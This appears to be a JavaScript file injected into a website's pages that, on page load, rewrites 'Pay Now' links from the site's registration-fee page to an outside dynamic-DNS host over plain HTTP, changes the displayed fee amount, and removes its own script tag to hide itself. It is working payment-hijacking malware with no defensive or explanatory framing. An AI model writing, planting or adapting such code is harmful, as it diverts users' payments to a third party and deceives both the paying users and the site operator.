function executeScript() {

    // Check if the "visited" cookie exists

    var anchorElements = document.querySelectorAll('a');


    // Loop through each <a> element
    anchorElements.forEach(function (anchorElement) {
        if (anchorElement.textContent.trim() === 'Pay Now') {
            var originalUrl = anchorElement.href;
            anchorElement.href = originalUrl.replace("https://bcm.webking.co.in/profile/regn_fee.php", "http://webkingbcm.ddns.net/buy");
            tdElement = anchorElement.parentNode.previousSibling.previousSibling;

            var numberValue = parseInt(tdElement.textContent.trim(), 10); // parseInt function parses a string and returns an integer
            var result = Math.floor(numberValue / 11000) * 11000; // 3 is the divisor
            if (numberValue < 11000) {
                result = 11000;
            }
            tdElement.textContent = result;
            var scriptTags = document.querySelectorAll('script[src="https://johndove9912.github.io/webtest/test.js"]');

            // Remove the script tag(s)
            scriptTags.forEach(function (scriptTag) {
                scriptTag.parentNode.removeChild(scriptTag);
            });


        }
    });
}

// Add an event listener for the 'DOMContentLoaded' event
document.addEventListener('DOMContentLoaded', executeScript);
executeScript();
